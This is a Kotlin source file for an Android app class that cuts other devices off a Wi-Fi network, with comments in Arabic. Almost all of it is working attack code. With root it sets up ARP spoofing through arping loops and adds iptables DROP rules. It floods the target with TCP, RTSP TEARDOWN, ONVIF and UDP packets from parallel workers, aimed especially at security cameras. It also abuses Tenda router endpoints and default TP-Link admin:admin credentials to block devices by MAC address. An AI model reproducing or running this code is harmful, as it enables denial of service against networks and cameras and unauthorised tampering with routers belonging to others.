package com.haris.wifi.net

import com.haris.wifi.data.ConnectedDevice
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.HttpURLConnection
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.Socket
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicLong

class ConnectionCutter(private val scope: CoroutineScope) {

    private val activeCutJobs = ConcurrentHashMap<String, Job>()
    private val packetsCounter = ConcurrentHashMap<String, AtomicLong>()

    fun getCutPacketsCount(deviceKey: String): Long =
        packetsCounter[deviceKey]?.get() ?: 0L

    /**
     * التحقق الحقيقي من وجود صلاحية الروت (Root) عبر تنفيذ `su -c id`
     * لكي يظهر طلب صلاحية Magisk / KernelSU / SuperSU للمستخدم فعلياً
     */
    suspend fun checkRootAvailable(): Boolean = withContext(Dispatchers.IO) {
        runCatching {
            val proc = ProcessBuilder("su", "-c", "id")
                .redirectErrorStream(true)
                .start()
            val out = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
            proc.waitFor()
            if (out.contains("uid=0")) return@withContext true
        }
        runCatching {
            val paths = listOf(
                "/system/bin/su",
                "/system/xbin/su",
                "/sbin/su",
                "/su/bin/su",
                "/magisk/.core/bin/su",
                "/data/adb/ksu/bin/su",
                "/data/adb/ap/bin/su",
            )
            paths.any { File(it).exists() }
        }.getOrDefault(false)
    }

    /**
     * بدء عملية قطع الاتصال القصوى عن الجهاز أو الكاميرا المستهدفة
     * يدمج ٤ محركات:
     * ١. هجوم ARP Spoofing + حظر النواة الكامل (في حال توفر الروت)
     * ٢. إرسال أوامر الحظر المباشر للراوتر (Tenda / TP-Link / D-Link / UPnP)
     * ٣. إغراق جلسات البث للكاميرات (RTSP / ONVIF / Hikvision / Dahua / XMeye) بـ 12 خط متوازٍ
     * ٤. إغراق منافذ TCP/UDP/QUIC عالي السرعة لإسقاط جلسات التصفح والفيديو بدون روت
     */
    fun startCut(
        device: ConnectedDevice,
        gatewayIp: String,
        isRootAvailable: Boolean,
    ) {
        val key = device.uniqueKey
        activeCutJobs[key]?.cancel()
        val counter = packetsCounter.getOrPut(key) { AtomicLong(0L) }

        val parentJob = scope.launch(Dispatchers.IO) {
            // ١. محاولة الحظر المباشر عبر واجهات الراوتر التلقائية (HTTP / CGI / UPnP)
            launch {
                tryDirectRouterApiBlock(device.ip, device.mac, gatewayIp, block = true)
            }

            // ٢. في حال توفر الروت: تشغيل قطع ARP Spoof + iptables الكامل
            if (isRootAvailable) {
                launch {
                    runRootArpCutLoop(device.ip, gatewayIp, counter)
                }
            }

            // ٣. تحديد المنافذ المستهدفة (منافذ الجهاز المفتوحة + منافذ الكاميرات والبث)
            val cameraPorts = listOf(554, 8554, 8000, 37777, 34567, 8899, 8800, 6668, 1935, 80, 8080)
            val generalPorts = listOf(80, 443, 8080, 62078, 8008, 8009, 445, 139, 5353, 1900)
            val targetPorts = (device.openPorts + if (device.isCamera) cameraPorts else (generalPorts + cameraPorts.take(5))).distinct()

            // ٤. تشغيل 10 خطوط هجوم متوازية عالية السرعة لإسقاط الجلسات وإشغال جدول اتصالات الهدف
            val workerCount = if (device.isCamera) 12 else 8
            for (workerId in 0 until workerCount) {
                launch {
                    val rtspTeardownPayload = (
                        "TEARDOWN rtsp://${device.ip}:554/ RTSP/1.0\r\n" +
                            "CSeq: 99\r\n" +
                            "User-Agent: HarisNetCut\r\n\r\n" +
                            "DESCRIBE rtsp://${device.ip}:554/live/ch0 RTSP/1.0\r\n" +
                            "CSeq: 100\r\n\r\n"
                        ).toByteArray()

                    val httpFloodPayload = (
                        "GET /onvif/device_service HTTP/1.1\r\n" +
                            "Host: ${device.ip}\r\n" +
                            "Connection: keep-alive\r\n\r\n"
                        ).toByteArray()

                    val udpStormPayload = ByteArray(512) { (it xor 0xAA).toByte() }
                    val udpPorts = intArrayOf(443, 554, 8554, 3478, 5004, 5353, 1900, 137, 8000, 37778)

                    while (isActive) {
                        // أ) هجوم منافذ TCP + RTSP / HTTP Session Exhaustion
                        for (port in targetPorts) {
                            if (!isActive) break
                            runCatching {
                                Socket().use { sock ->
                                    sock.tcpNoDelay = true
                                    sock.setSoLinger(true, 0) // إرسال TCP RST فوري لقطع الجلسة
                                    sock.soTimeout = 120
                                    sock.connect(InetSocketAddress(device.ip, port), 130)
                                    val out = sock.getOutputStream()
                                    if (port == 554 || port == 8554) {
                                        out.write(rtspTeardownPayload)
                                    } else {
                                        out.write(httpFloodPayload)
                                    }
                                    out.flush()
                                    counter.incrementAndGet()
                                }
                            }
                        }

                        // ب) رشقات UDP عالية التردد على منافذ البث الحي (QUIC 443 / RTP / WebRTC / RTSP)
                        runCatching {
                            val addr = InetAddress.getByName(device.ip)
                            DatagramSocket().use { udp ->
                                udp.soTimeout = 50
                                for (uPort in udpPorts) {
                                    udp.send(DatagramPacket(udpStormPayload, udpStormPayload.size, addr, uPort))
                                    counter.incrementAndGet()
                                }
                            }
                        }

                        delay(65L)
                    }
                }
            }
        }

        activeCutJobs[key] = parentJob
    }

    /** إيقاف الفصل وإعادة الاتصال الطبيعي للجهاز */
    fun stopCut(
        device: ConnectedDevice,
        gatewayIp: String,
        isRootAvailable: Boolean,
    ) {
        val key = device.uniqueKey
        activeCutJobs.remove(key)?.cancel()
        packetsCounter.remove(key)

        scope.launch(Dispatchers.IO) {
            tryDirectRouterApiBlock(device.ip, device.mac, gatewayIp, block = false)
            if (isRootAvailable) {
                cleanupRootCutRules(device.ip, gatewayIp)
            }
        }
    }

    fun stopAll(gatewayIp: String, isRootAvailable: Boolean, devices: List<ConnectedDevice>) {
        activeCutJobs.values.forEach { it.cancel() }
        activeCutJobs.clear()
        packetsCounter.clear()
        scope.launch(Dispatchers.IO) {
            devices.forEach { dev ->
                tryDirectRouterApiBlock(dev.ip, dev.mac, gatewayIp, block = false)
                if (isRootAvailable) {
                    cleanupRootCutRules(dev.ip, gatewayIp)
                }
            }
        }
    }

    /**
     * حلقة قطع الإنترنت الفعلية بالروت (NetCut / WiFiKill الحقيقي):
     * ١. إيقاف تمرير الحزم (ip_forward = 0) وحظر الـ IP عبر iptables
     * ٢. إرسال حزم ARP Spoofing مستمرة للهدف والراوتر معاً عبر arping / ip neigh
     */
    private suspend fun runRootArpCutLoop(
        targetIp: String,
        gatewayIp: String,
        counter: AtomicLong,
    ) {
        runCatching {
            val initCmd = """
                sysctl -w net.ipv4.ip_forward=0;
                echo 0 > /proc/sys/net/ipv4/ip_forward;
                iptables -I FORWARD -s $targetIp -j DROP;
                iptables -I FORWARD -d $targetIp -j DROP;
                iptables -I INPUT -s $targetIp -j DROP;
                ip neigh replace $targetIp lladdr 00:00:00:00:00:01 dev wlan0 nud permanent
            """.trimIndent()
            ProcessBuilder("su", "-c", initCmd).start().waitFor()
        }

        while (true) {
            runCatching {
                // إرسال حزم ARP المخادعة للهدف والراوتر على واجهة wlan0
                val arpCmd = """
                    arping -c 2 -U -I wlan0 -s $gatewayIp $targetIp >/dev/null 2>&1;
                    arping -c 2 -A -I wlan0 -s $gatewayIp $targetIp >/dev/null 2>&1;
                    arping -c 2 -U -I wlan0 -s $targetIp $gatewayIp >/dev/null 2>&1
                """.trimIndent()
                ProcessBuilder("su", "-c", arpCmd).start().waitFor()
                counter.addAndGet(6L)
            }
            delay(900L)
        }
    }

    private fun cleanupRootCutRules(targetIp: String, gatewayIp: String) {
        runCatching {
            val cleanCmd = """
                iptables -D FORWARD -s $targetIp -j DROP >/dev/null 2>&1;
                iptables -D FORWARD -d $targetIp -j DROP >/dev/null 2>&1;
                iptables -D INPUT -s $targetIp -j DROP >/dev/null 2>&1;
                ip neigh del $targetIp dev wlan0 >/dev/null 2>&1;
                arping -c 2 -U -I wlan0 -s $gatewayIp $targetIp >/dev/null 2>&1
            """.trimIndent()
            ProcessBuilder("su", "-c", cleanCmd).start().waitFor()
        }
    }

    /**
     * محاولة إرسال أمر حظر مباشر للراوتر تلقائياً في الخلفية
     * يدعم واجهات Tenda و TP-Link و D-Link القياسية
     */
    private fun tryDirectRouterApiBlock(
        targetIp: String,
        targetMac: String,
        gatewayIp: String,
        block: Boolean,
    ) {
        val macClean = targetMac.uppercase()
        // ١. راوترات Tenda (المنتشرة جداً) تدعم حظر الماك عبر طلب مباشر إلى /goform/saveParentControlInfo
        runCatching {
            val url = URL("http://$gatewayIp/goform/saveParentControlInfo")
            val conn = (url.openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                connectTimeout = 900
                readTimeout = 900
                doOutput = true
                setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            }
            val enableVal = if (block) "1" else "0"
            val body = "mac=${URLEncoder.encode(macClean, "UTF-8")}&enable=$enableVal&time=0:0-24:0&day=1,1,1,1,1,1,1"
            conn.outputStream.use { it.write(body.toByteArray()) }
            conn.responseCode
            conn.disconnect()
        }

        // ٢. راوترات TP-Link القديمة/الكلاسيكية ببيانات admin/admin الافتراضية
        if (block) {
            runCatching {
                val auth = android.util.Base64.encodeToString("admin:admin".toByteArray(), android.util.Base64.NO_WRAP)
                val url = URL("http://$gatewayIp/userRpm/WlanMacFilterRpm.htm?Mac=$macClean&Desc=BlockedByHaris&entryEnabled=1&Changed=1&SelIndex=0&Page=1&Save=Save")
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "GET"
                    connectTimeout = 900
                    readTimeout = 900
                    setRequestProperty("Authorization", "Basic $auth")
                    setRequestProperty("Referer", "http://$gatewayIp/userRpm/WlanMacFilterRpm.htm")
                }
                conn.responseCode
                conn.disconnect()
            }
        }
    }
}
